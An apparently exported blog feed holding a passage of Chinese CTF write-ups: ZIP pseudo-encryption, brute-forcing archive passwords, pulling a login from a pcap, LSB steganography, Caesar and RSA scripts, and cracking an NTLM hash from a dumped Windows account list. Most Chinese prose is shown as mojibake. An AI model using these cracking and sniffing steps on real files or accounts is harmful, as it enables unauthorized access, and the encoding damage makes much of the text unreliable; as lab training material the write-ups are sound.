00ÔºöÊñá‰ª∂ÂêçÈïøÂ∫¶</p><p>24 00ÔºöÊâ©Â±ïÂ≠óÊÆµÈïøÂ∫¶</p><p>00 00ÔºöÊñá‰ª∂Ê≥®ÈáäÈïøÂ∫¶</p><p>00 00ÔºöÁ£ÅÁõòÂºÄÂßãÂè∑</p><p>00 00ÔºöÂÜÖÈÉ®Êñá‰ª∂Â±ûÊÄß</p><p>20 00 00 00ÔºöÂ§ñÈÉ®Êñá‰ª∂Â±ûÊÄß</p><p>00 00 00 00ÔºöÂ±ÄÈÉ®Â§¥ÈÉ®ÂÅèÁßªÈáè</p><h2 id="ÂéãÁº©Ê∫êÊñá‰ª∂ÁõÆÂΩïÁªìÊùüÊ†áÂøóÔºö"><a href="#ÂéãÁº©Ê∫êÊñá‰ª∂ÁõÆÂΩïÁªìÊùüÊ†áÂøóÔºö" class="headerlink" title="ÂéãÁº©Ê∫êÊñá‰ª∂ÁõÆÂΩïÁªìÊùüÊ†áÂøóÔºö"></a>ÂéãÁº©Ê∫êÊñá‰ª∂ÁõÆÂΩïÁªìÊùüÊ†áÂøóÔºö</h2><p>50 4B 05 06ÔºöÁõÆÂΩïÁªìÊùüÊ†áËÆ∞</p><p>00 00ÔºöÂΩìÂâçÁ£ÅÁõòÁºñÂè∑</p><p>00 00ÔºöÁõÆÂΩïÂå∫ÂºÄÂßãÁ£ÅÁõòÁºñÂè∑</p><p>01 00ÔºöÊú¨Á£ÅÁõò‰∏äÁ∫™ÂΩïÊÄªÊï∞</p><p>01 00ÔºöÁõÆÂΩïÂå∫‰∏≠Á∫™ÂΩïÊÄªÊï∞</p><p>59 00 00 00ÔºöÁõÆÂΩïÂå∫Â∞∫ÂØ∏Â§ßÂ∞è</p><p>3E 00 00 00ÔºöÁõÆÂΩïÂå∫ÂØπÁ¨¨‰∏ÄÂº†Á£ÅÁõòÁöÑÂÅèÁßªÈáè</p><p>00 00ÔºöZIP Êñá‰ª∂Ê≥®ÈáäÈïøÂ∫¶</p><p>Âõ†Ê≠§ÔºåÊ†πÊçÆÊ≠§È¢òÁõÆÊù•ÁúãÔºö</p><p><strong>ÂéãÁº©Ê∫êÊñá‰ª∂Êï∞ÊçÆÂå∫</strong>Ôºö50 4B 03 04ÔºöËøôÊòØÂ§¥Êñá‰ª∂Ê†áËÆ∞</p><p><strong>ÂéãÁº©Ê∫êÊñá‰ª∂ÁõÆÂΩïÂå∫Ôºö</strong></p><p>50 4B 01 02ÔºöÁõÆÂΩï‰∏≠Êñá‰ª∂Êñá‰ª∂Â§¥Ê†áËÆ∞</p><p>3F 00ÔºöÂéãÁº©‰ΩøÁî®ÁöÑ pkware ÁâàÊú¨ </p><p>14 00ÔºöËß£ÂéãÊñá‰ª∂ÊâÄÈúÄ pkware ÁâàÊú¨ </p><p>00 00ÔºöÂÖ®Â±ÄÊñπÂºè‰ΩçÊ†áËÆ∞ÔºàÊúâÊó†Âä†ÂØÜÔºåËøô‰∏™Êõ¥ÊîπËøôÈáåËøõË°å‰º™Âä†ÂØÜÔºåÊîπ‰∏∫09 00ÊâìÂºÄÂ∞±‰ºöÊèêÁ§∫ÊúâÂØÜÁ†Å‰∫ÜÔºâ</p><p><strong>ÂéãÁº©Ê∫êÊñá‰ª∂ÁõÆÂΩïÁªìÊùüÊ†áÂøó</strong> Ôºö50 4B 05 06ÔºöÁõÆÂΩïÁªìÊùüÊ†áËÆ∞ </p><p><img src="https://img-blog.csdnimg.cn/b4f6011275304c798465c33b8b83a77e.png" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> Áü•ËØÜÁÇπ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf‰πãMISC</title>
      <link href="/2023/01/10/buuctf%E4%B9%8BMISC/"/>
      <url>/2023/01/10/buuctf%E4%B9%8BMISC/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="Âü∫Á°ÄÁ†¥Ëß£"><a href="#Âü∫Á°ÄÁ†¥Ëß£" class="headerlink" title="Âü∫Á°ÄÁ†¥Ëß£"></a>Âü∫Á°ÄÁ†¥Ëß£</h2><blockquote><p>Áªô‰Ω†‰∏Ä‰∏™ÂéãÁº©ÂåÖÔºå‰Ω†Âπ∂‰∏çËÉΩËé∑Âæó‰ªÄ‰πàÔºåÂõ†‰∏∫‰ªñÊòØÂõõ‰ΩçÊï∞Â≠óÂä†ÂØÜÁöÑÂìàÂìàÂìàÂìàÂìàÂìàÂìà„ÄÇ„ÄÇ„ÄÇ‰∏çÂØπ&#x3D; &#x3D;ÊàëËØ¥‰∫Ü‰ªÄ‰πà‰∫Ü‰∏çÂæóÁöÑ‰∏úË•ø„ÄÇ„ÄÇ Ê≥®ÊÑèÔºöÂæóÂà∞ÁöÑ flag ËØ∑ÂåÖ‰∏ä flag{} Êèê‰∫§</p></blockquote><p>‰∏ãËΩΩÊñá‰ª∂Ëß£Âéã‰πãÂêéÂèàÂæóÂà∞‰∏Ä‰∏™ÂéãÁº©ÂåÖflag.txtË¢´Âä†ÂØÜ‰∫ÜÔºåÊèêÁ§∫ÂØÜÁ†ÅÊòØ‰∏Ä‰∏™4‰ΩçÊï∞Â≠óÔºåÁî®ARCHPRËøõË°åÊö¥ÂäõÁ†¥Ëß£ÔºåÈÄâÊã©Â≠óÂÖ∏ËøõË°åÁàÜÁ†¥<br><img src="https://img-blog.csdnimg.cn/c5332cec653f456dbf9d874b3cb7a2c3.png" alt="1"><br>ÂæóÂà∞ÂØÜÁ†ÅÔºåËæìÂÖ•ÂØÜÁ†ÅÂêéÂæóÂà∞‰∏Ä‰∏™base64Âä†ÂØÜÁöÑÂØÜÊñáÔºåËß£ÂØÜÂêé‰∏∫flag„ÄÇ</p><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><blockquote><p>ÈªëÂÆ¢ÈÄöËøáwiresharkÊäìÂà∞ÁÆ°ÁêÜÂëòÁôªÈôÜÁΩëÁ´ôÁöÑ‰∏ÄÊÆµÊµÅÈáèÂåÖÔºàÁÆ°ÁêÜÂëòÁöÑÂØÜÁ†ÅÂç≥ÊòØÁ≠îÊ°à) Ê≥®ÊÑèÔºöÂæóÂà∞ÁöÑ flag ËØ∑ÂåÖ‰∏ä flag{} Êèê‰∫§</p></blockquote><p>ÂæóÂà∞‰∏Ä‰∏™pcapÊñá‰ª∂</p><blockquote><p> pcapÊñá‰ª∂ÊòØÂ∏∏Áî®ÁöÑÊï∞ÊçÆÊä•Â≠òÂÇ®Ê†ºÂºèÔºåÂèØ‰ª•ÁêÜËß£‰∏∫Â∞±ÊòØ‰∏ÄÁßçÊñá‰ª∂Ê†ºÂºèÔºåÂè™‰∏çËøáÈáåÈù¢ÁöÑÊï∞ÊçÆÊòØÊåâÁÖßÁâπÂÆöÊ†ºÂºèÂ≠òÂÇ®ÁöÑÔºåÊâÄ‰ª•Êàë‰ª¨ÊÉ≥Ë¶ÅËß£ÊûêÈáåÈù¢ÁöÑÊï∞ÊçÆÔºå‰πüÂøÖÈ°ªÊåâÁÖß‰∏ÄÂÆöÁöÑÊ†ºÂºè„ÄÇÊôÆÈÄöÁöÑËÆ∞‰∫ãÊú¨ÊâìÂºÄpcapÊñá‰ª∂ÊòæÁ§∫ÁöÑÊòØ‰π±Á†ÅÔºåÁî®ÂÆâË£Ö‰∫ÜHEX-EditorÊèí‰ª∂ÁöÑNotepad++ÊâìÂºÄÔºåËÉΩÂ§ü‰ª•16ËøõÂà∂Êï∞ÊçÆÁöÑÊ†ºÂºèÊòæÁ§∫ÔºåÁî®wiresharkËøôÁßçÊäìÂåÖÂ∑•ÂÖ∑Â∞±ÂèØ‰ª•Ê≠£Â∏∏ÊâìÂºÄËøôÁßçÊñá‰ª∂ÔºåÊÑâÂø´Âú∞Êü•ÁúãÈáåÈù¢ÁöÑÁΩëÁªúÊï∞ÊçÆÊä•‰∫ÜÔºåÂêåÊó∂wireshark‰πüÂèØ‰ª•ÁîüÊàêËøôÁßçÊ†ºÂºèÁöÑÊñá‰ª∂„ÄÇÂΩìÁÑ∂Ëøô‰∫õÂ∑•ÂÖ∑Âè™ÊòØÊàëÁªèÂ∏∏‰ΩøÁî®ÁöÑÔºåËøòÊúâÂæàÂ§öÂÖ∂ÂÆÉËÉΩÂ§üÊü•ÁúãpcapÊñá‰ª∂ÁöÑÂ∑•ÂÖ∑„ÄÇ</p></blockquote><p>ÊòæÁÑ∂ÊòØÊµÅÈáèÂàÜÊûêÔºåÁôªÈôÜÁΩëÁ´ô‰∏ÄËà¨ÊòØHTTP postËØ∑Ê±ÇÔºåÁî®wiresharkÊâìÂºÄËøô‰∏™pcapÊï∞ÊçÆÂåÖÂêéÔºåÊü•Êâæhttp,Âè™Êúâ‰∏Ä‰∏™postËØ∑Ê±Ç<br><img src="https://img-blog.csdnimg.cn/2d8aee32f07a487d850f0b12fbd4e267.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/6128dbdf6f9c4bbabe0e3ab4d8e36c64.png" alt="2"><br>ÊâæÂà∞flag.</p><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>ÊâìÂºÄÂêéÁªô‰∏Ä‰∏™Ê†°ÂæΩÔºåÁî±‰∫éÈ¢òÁõÆÊòØLSB</p><p><img src="https://img-blog.csdnimg.cn/64da9c8efb0a43d9b91316ee9b886da0.png" alt="1"></p><blockquote><p>LSBÂÖ®Áß∞leastsignificant bitÔºåÊòØ‰∏ÄÁßçÂü∫‰∫éÂõæÁâáÊúÄ‰ΩéÊúâÊïà‰Ωç‰øÆÊîπÂÇ®Â≠ò‰ø°ÊÅØÁöÑÈöêÂÜôÊñπÊ≥ïÔºåÂõæÁâáÈááÁî®ÂÉèÁ¥†ÁÇπÊûÑ‰πòÔºåÂà©Áî®‰∫∫ËÇâÁúºËßÜËßâÂàÜËæ®ÁéáÁöÑÈôêÂà∂ÔºåÂÉèÁ¥†ÁÇπÁöÑ‰Ωé‰ΩçÂèòÂåñÂºïËµ∑ÂõæÁâáÊï¥‰ΩìÁöÑÂèòÂåñÂæÆ‰πéÂÖ∂ÂæÆÔºåËÇâÁúº‰∏çË∂≥‰∏éÂØüËßâÂá∫ÂºÇÂ∏∏„ÄÇÂêåÊ†∑ÁöÑMLSBÊó®Âú®‰∏çË¢´‰∫∫ÁúºÂØüËßâÂá∫ÂºÇÂ∏∏ÁöÑÊÉÖÂÜµ‰∏ãÔºåÂ∞ΩÂèØËÉΩÁöÑÂ§öËóèÂá†‰Ωç‰ø°ÊÅØÔºå‰ªéËÄåÊèêÈ´òÊ∂àÊÅØÈöêËóèÁöÑÊïàÁéáÂíåÂÆπÈáè„ÄÇ</p></blockquote><p>ÈÇ£Â∞±Áî®stegsolveÊâìÂºÄ<br><img src="https://img-blog.csdnimg.cn/ef28ba074c0f480fb77fdf873f929c14.png" alt="2"><br>ÂæóÂà∞‰∏Ä‰∏™‰∫åÁª¥Á†Å<br><img src="https://img-blog.csdnimg.cn/1f0756bb9f6e4fb6824fb3d4c92ef795.png" alt="3"><br>Êâ´‰∫åÁª¥Á†ÅÂæóÂà∞flag„ÄÇ</p><h2 id="zip‰º™Âä†ÂØÜ"><a href="#zip‰º™Âä†ÂØÜ" class="headerlink" title="zip‰º™Âä†ÂØÜ"></a>zip‰º™Âä†ÂØÜ</h2><p>Ë¢´‰º™Âä†ÂØÜ‰∫ÜÔºåÁî®010editorÊâìÂºÄ<br><img src="https://img-blog.csdnimg.cn/81cfb24d08d3451580870b94ad0da351.png" alt="1"></p><p><img src="https://img-blog.csdnimg.cn/da5cdea1475a4986bf29cd72e26ecbf5.png" alt="2"><br><strong>09 00Êîπ‰∏∫00 00</strong>‰øùÂ≠òÂêéÂæóÂà∞flag„ÄÇ<strong>flag{Adm1N-B2G-kU-SZIP}</strong></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf‰πãcryptoÈÉ®ÂàÜËß£È¢òÊÄùË∑Ø</title>
      <link href="/2023/01/09/buuctf%E4%B9%8Bcrypto%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/"/>
      <url>/2023/01/09/buuctf%E4%B9%8Bcrypto%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="Â§ßÂ∏ùÁöÑÂØÜÁ†ÅÊ≠¶Âô®"><a href="#Â§ßÂ∏ùÁöÑÂØÜÁ†ÅÊ≠¶Âô®" class="headerlink" title="Â§ßÂ∏ùÁöÑÂØÜÁ†ÅÊ≠¶Âô®"></a>Â§ßÂ∏ùÁöÑÂØÜÁ†ÅÊ≠¶Âô®</h2><p><strong>È¢òÁõÆ</strong></p><blockquote><p>ÂÖ¨ÂÖÉÂâç‰∏ÄÁôæÂπ¥ÔºåÂú®ÁΩóÈ©¨Âá∫Áîü‰∫Ü‰∏Ä‰ΩçÂØπ‰∏ñÁïåÂΩ±ÂìçÂ∑®Â§ßÁöÑ‰∫∫Áâ©Ôºå‰ªñÁîüÂâçÊòØÁΩóÈ©¨‰∏âÂ∑®Â§¥‰πã‰∏Ä„ÄÇ<br>‰ªñÁéáÂÖà‰ΩøÁî®‰∫Ü‰∏ÄÁßçÁÆÄÂçïÁöÑÂä†ÂØÜÂáΩÔºåÂõ†Ê≠§ËøôÁßçÂä†ÂØÜÊñπÊ≥ï‰ª•‰ªñÁöÑÂêçÂ≠óÂëΩÂêç„ÄÇ<br>‰ª•‰∏ãÂØÜÊñáË¢´Ëß£ÂºÄÂêéÂèØ‰ª•Ëé∑Âæó‰∏Ä‰∏™ÊúâÊÑè‰πâÁöÑÂçïËØçÔºö<strong>FRPHEVGL</strong><br>‰Ω†ÂèØ‰ª•Áî®Ëøô‰∏™Áõ∏ÂêåÁöÑÂä†ÂØÜÂêëÈáèÂä†ÂØÜÈôÑ‰ª∂‰∏≠ÁöÑÂØÜÊñáÔºå‰Ωú‰∏∫Á≠îÊ°àËøõË°åÊèê‰∫§„ÄÇ</p></blockquote><p>ËøõË°åÂáØÊííÂØÜÁ†ÅËß£ÂØÜ<br>pythonËÑöÊú¨Ôºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">min</span><span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>    <span class="token builtin">max</span><span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> offset <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        plaint<span class="token operator">=</span><span class="token string">''</span>        <span class="token keyword">for</span> s <span class="token keyword">in</span> secret<span class="token punctuation">:</span>            o<span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">+</span>offset            o<span class="token operator">=</span><span class="token punctuation">(</span>o<span class="token operator">-</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">if</span> o<span class="token operator">></span><span class="token builtin">max</span> <span class="token keyword">else</span> o            plaint<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>plaint<span class="token punctuation">,</span>offset<span class="token punctuation">)</span>str_secret<span class="token operator">=</span><span class="token string">'FRPHEVGL'</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>decode<span class="token punctuation">(</span>str_secret<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂæóÂà∞Ôºö</p><blockquote><p>frphevgl 0<br>gsqifwhm 1<br>htrjgxin 2<br>iuskhyjo 3<br>jvtlizkp 4<br>kwumjalq 5<br>lxvnkbmr 6<br>mywolcns 7<br>nzxpmdot 8<br>oayqnepu 9<br>pbzrofqv 10<br>qcaspgrw 11<br>rdbtqhsx 12<br>security 13<br>tfdvsjuz 14<br>ugewtkva 15<br>vhfxulwb 16<br>wigyvmxc 17<br>xjhzwnyd 18<br>ykiaxoze 19<br>zljbypaf 20<br>amkczqbg 21<br>bnldarch 22<br>comebsdi 23<br>dpnfctej 24<br>eqogdufk 25</p></blockquote><p>Áßª‰Ωç13ÂæóÂà∞security„ÄÇÂÜçÂØπÈôÑ‰ª∂‰∏≠ÁöÑÂØÜÊñáÂä†ÂØÜÔºöComeChina<br>Ê≥®ÊÑèÂ§ßÂ∞èÂÜô</p><p><img src="https://img-blog.csdnimg.cn/cc5d04de020147259e4ab27b26e5a941.png" alt="1"><br>PË¶ÅÂ§ßÂÜô<strong>flag{PbzrPuvan}</strong></p><h2 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h2><blockquote><p>Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm.&#x2F;&#x2F;Êï∞Â≠¶ÂæàÈÖ∑ÔºÅ‰ΩøÁî® RSA ÁÆóÊ≥ïËß£Á†ÅÁßòÂØÜÊ∂àÊÅØÔºåc„ÄÅ p„ÄÅ q Âíå e ÊòØ RSA ÁÆóÊ≥ïÁöÑÂèÇÊï∞</p></blockquote><blockquote><p>p &#x3D;  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483<br>q &#x3D;  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407<br>e &#x3D;  65537<br>c &#x3D;  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</p></blockquote><blockquote><p>Use RSA to find the secret message&#x2F;&#x2F;‰ΩøÁî®RSAÊù•ÊâæÂà∞ÁßòÂØÜÊ∂àÊÅØ</p></blockquote><p>Â∑≤Áü•c,p,q,e,n&#x3D;p*q,Ê±ÇÊòéÊñáM<br>pythonËÑöÊú¨Ôºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''Â∑≤Áü•p,q,e,c.ÂæàÊòéÊúó‰∫ÜÔºåÊ±ÇdÂÜçËß£Ôºö'''</span><span class="token keyword">import</span> gmpy2e <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> <span class="token number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span>q <span class="token operator">=</span> <span class="token number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span>n <span class="token operator">=</span> p <span class="token operator">*</span> q<span class="token comment"># ÂØÜÊñá</span>C <span class="token operator">=</span> <span class="token number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token comment"># Ê±ÇÊòéÊñá</span>M <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>C<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>  <span class="token comment"># Âø´ÈÄüÊ±ÇÂπÇÂèñÊ®°ËøêÁÆó</span><span class="token keyword">print</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Ëß£Âá∫MÂÄºÔºö5577446633554466577768879988<br><strong>flag{5577446633554466577768879988}</strong></p><h2 id="WindowsÁ≥ªÁªüÂØÜÁ†Å"><a href="#WindowsÁ≥ªÁªüÂØÜÁ†Å" class="headerlink" title="WindowsÁ≥ªÁªüÂØÜÁ†Å"></a>WindowsÁ≥ªÁªüÂØÜÁ†Å</h2><p>ÂÜÖÂÆπÔºö</p><blockquote><p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>ctf:1002:06af9108f2e1fecf144e2e8adef09efd:a7fcb22a88038f35a8f39d503e7f0062:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:bef14eee40dffbc345eeb3f58e290d56:::</p></blockquote><p>ÂÉèhashÂØÜÁ†ÅÔºå<strong>Â∏∏Áî®hashÁÆóÊ≥ïÔºö</strong><br><img src="https://img-blog.csdnimg.cn/93de742bfb504a6ebe0ea469b3fe75d1.png" alt="1"><br>ÂÖàËØïËØïMD5Ôºå<strong>a7fcb22a88038f35a8f39d503e7f0062</strong>ÊòéÊñá‰∏∫<strong>good-luck</strong><a href="https://www.cmd5.com/">md5Ëß£ÂØÜ</a><br><strong>flag{good-luck}</strong></p><h2 id="‰∏≠ÊñáÁîµÁ†Å"><a href="#‰∏≠ÊñáÁîµÁ†Å" class="headerlink" title="‰∏≠ÊñáÁîµÁ†Å"></a>‰∏≠ÊñáÁîµÁ†Å</h2><h3 id="Êù•Ê∫ê"><a href="#Êù•Ê∫ê" class="headerlink" title="Êù•Ê∫ê"></a>Êù•Ê∫ê</h3><p>„ÄÄ„ÄÄ‰∏≠ÊñáÁîµÁ†ÅÔºåÂèàÁß∞‰∏≠ÊñáÂïÜÁî®ÁîµÁ†Å„ÄÅ‰∏≠ÊñáÁîµÊä•Á†ÅÊàñ‰∏≠ÊñáÁîµÊä•ÊòéÁ†ÅÔºåÂéüÊú¨ÊòØ‰∫éÁîµÊä•‰πã‰∏≠‰º†ÈÄÅ‰∏≠Êñá‰ø°ÊÅØÁöÑÊñπÊ≥ï„ÄÇÂÆÉÊòØÁ¨¨‰∏Ä‰∏™ÊääÊ±âÂ≠óÂåñ‰ΩúÁîµÂ≠êËÆØÂè∑ÁöÑÁºñÁ†ÅË°®„ÄÇ<br>„ÄÄ„ÄÄËá™Êë©Â∞îÊñØÁîµÁ†ÅÂú®1835Âπ¥ÂèëÊòéÂêéÔºå‰∏ÄÁõ¥Âè™ËÉΩÁî®Êù•‰º†ÈÄÅËã±ËØ≠Êàñ‰ª•Êãâ‰∏ÅÂ≠óÊØçÊãºÂÜôÁöÑÊñáÂ≠ó„ÄÇ1873Âπ¥ÔºåÊ≥ïÂõΩÈ©ªÂçé‰∫∫ÂëòÂ®ÅÂü∫Êù∞ÔºàS¬∑A¬∑ViguerÔºâÂèÇÁÖß„ÄäÂ∫∑ÁÜôÂ≠óÂÖ∏„ÄãÁöÑÈÉ®È¶ñÊéíÂàóÊñπÊ≥ïÔºåÊåëÈÄâ‰∫ÜÂ∏∏Áî®Ê±âÂ≠ó6800Â§ö‰∏™ÔºåÁºñÊàê‰∫ÜÁ¨¨‰∏ÄÈÉ®Ê±âÂ≠óÁîµÁ†ÅÊú¨ÔºåÂêç‰∏∫„ÄäÁîµÊä•Êñ∞‰π¶„Äã„ÄÇÂêéÁî±ÊàëÂõΩÁöÑÈÉëËßÇÂ∫îÂ∞ÜÂÖ∂ÊîπÁºñÊàê‰∏∫„Ää‰∏≠ÂõΩÁîµÊä•Êñ∞Áºñ„Äã„ÄÇËøôÊòØ‰∏≠ÂõΩÊúÄÊó©ÁöÑÊ±âÂ≠óÁîµÁ†ÅÊú¨„ÄÇ‰∏≠ÂõΩ‰∫∫ÊúÄÊó©Á†îÂà∂ÁöÑÁîµÊä•Êú∫Âçé‰æ®ÂïÜ‰∫∫ÁéãÊâøËç£‰ªéÊ≥ïÂõΩÂõûÂõΩÂêéÔºå‰∏éÁ¶èÂ∑ûÁöÑÁéãÊñåÁ†îÂà∂Âá∫ÊàëÂõΩÁ¨¨‰∏ÄÂè∞ÁîµÊä•Êú∫ÔºåÂπ∂ÂëàËØ∑ÊîøÂ∫úËá™ÂäûÁîµÊä•„ÄÇÊ∏ÖÊîøÂ∫úÊãí‰∏çÈááÁ∫≥„ÄÇ</p><h3 id="Â∫îÁî®"><a href="#Â∫îÁî®" class="headerlink" title="Â∫îÁî®"></a>Â∫îÁî®</h3><p>„ÄÄ„ÄÄ‰∏≠ÊñáÁîµÁ†ÅÂèØÁî®‰ΩúÁîµËÑëÈáåÁöÑ‰∏≠ÊñáËæìÂÖ•Ê≥ïÔºå‰ΩÜÂõ†‰∏≠ÊñáÁîµÁ†ÅÊòØ‚ÄúÊó†ÁêÜÁ†Å‚ÄùÔºåËÆ∞ÂøÜÂõ∞ÈöæÔºå‰∏ÄËà¨Áî®Êà∑Âá†‰πéÊó†Ê≥ïÁÜüÁªÉÂú∞ÊéåÊè°‰ΩøÁî®„ÄÇ<br>„ÄÄ„ÄÄÂú®È¶ôÊ∏ØÔºåÊØè‰∏™Êúâ‰∏≠ÊñáÂßìÂêçÁöÑÂ∏ÇÊ∞ëÁöÑË∫´‰ªΩËØÅ‰∏äÔºåÂùá‰ºöÂú®‰ªñÁöÑÂßìÂêç‰∏ãÈù¢ÔºåÂç∞Êúâ‰∏≠ÊñáÁîµÁ†ÅÔºåÂ§ñÂõΩ‰∫∫ÂèñÂæóÁöÑÂÖ•Ê∏ØÁ≠æËØÅ‰∫¶ÊúâÂç∞‰∏ä„ÄÇÂú®ÂæàÂ§öÊîøÂ∫úÊàñÂïÜ‰∏öÊú∫ÊûÑÁöÑË°®Ê†º‰∏≠ÔºåÈÉΩ‰ºöË¶ÅÊ±ÇÂ°´ÂÜôËÄÖÂ°´ÂÜô‰ªñÁöÑ‰∏≠ÊñáÁîµÁ†ÅÔºå‰ª•‰æøËæìÂÖ•ÁîµËÑë„ÄÇ<br>„ÄÄ„ÄÄÁæéÂõΩÁ≠æËØÅÁî≥ËØ∑Ë°®ÔºàDS-160Ë°®Ôºâ‰∏≠ÔºåË¶ÅÊ±ÇÁî≥ËØ∑‰∫∫Â°´ÂÜôÂßìÂêçÁöÑ‰∏≠ÊñáÁîµÁ†ÅÔºå‰∏Ä‰∫õÁîüÂÉªÂ≠óÊ≤°ÊúâÂØπÂ∫îÁöÑ‰∏≠ÊñáÁîµÁ†ÅÊó∂ÔºåÂèØÁî®‚Äú0000‚Äù‰ª£Êõø„ÄÇ</p><h3 id="ÂéüÁêÜ"><a href="#ÂéüÁêÜ" class="headerlink" title="ÂéüÁêÜ"></a>ÂéüÁêÜ</h3><p>„ÄÄ„ÄÄ‰∏≠ÊñáÁîµÁ†ÅË°®ÈááÁî®‰∫ÜÂõõ‰ΩçÈòøÊãâ‰ºØÊï∞Â≠ó‰Ωú‰ª£Âè∑Ôºå‰ªé0001Âà∞9999ÊåâÂõõ‰ΩçÊï∞È°∫Â∫èÊéíÂàóÔºåÁî®Âõõ‰ΩçÊï∞Â≠óË°®Á§∫ÊúÄÂ§ö‰∏Ä‰∏á‰∏™Ê±âÂ≠ó„ÄÅÂ≠óÊØçÂíåÁ¨¶Âè∑„ÄÇÊ±âÂ≠óÂÖàÊåâÈÉ®È¶ñÔºåÂêéÊåâÁ¨îÂàíÊéíÂàó„ÄÇÂ≠óÊØçÂíåÁ¨¶Âè∑ÊîæÂà∞ÁîµÁ†ÅË°®ÁöÑÊúÄÂ∞æ„ÄÇÂêéÊù•Áî±‰∫é‰∏Ä‰∏á‰∏™Ê±âÂ≠ó‰∏çË∂≥‰ª•Â∫î‰ªòÊà∑Á±çÁÆ°ÁêÜÁöÑË¶ÅÊ±ÇÔºåÂèàÊúâÁ¨¨‰∫åÂ≠óÈù¢Ê±âÂ≠óÁöÑÂá∫Áé∞„ÄÇÂú®È¶ôÊ∏ØÔºå‰∏§‰∏™Â≠óÈù¢ÈÉΩÈááÁî®Âêå‰∏ÄÁºñÁ†ÅÔºåÁî±ËæìÂÖ•Âëò‰∫∫ÊâãÈÄâÊã©Â≠óÈù¢ÔºõÂú®Âè∞ÊπæÔºåÁ¨¨‰∫åÂ≠óÈù¢ÁöÑÊ±âÂ≠ó‰ºöÂú®ÂºÄÈ¶ñË°•‰∏ä‚Äú1‚ÄùÂ≠óÔºåÂèòÊàê5‰∏™Êï∞Â≠óÁöÑÁºñÁ†Å„ÄÇ</p><p>ÂØÜÊñáÔºö<strong>606046152623600817831216121621196386</strong><br><a href="https://dianma.bmcx.com/">‰∏≠ÊñáÁîµÁ†ÅÊü•ËØ¢</a></p><h2 id="ÂáØÊííÔºüÊõøÊç¢ÔºüÂëµÂëµ"><a href="#ÂáØÊííÔºüÊõøÊç¢ÔºüÂëµÂëµ" class="headerlink" 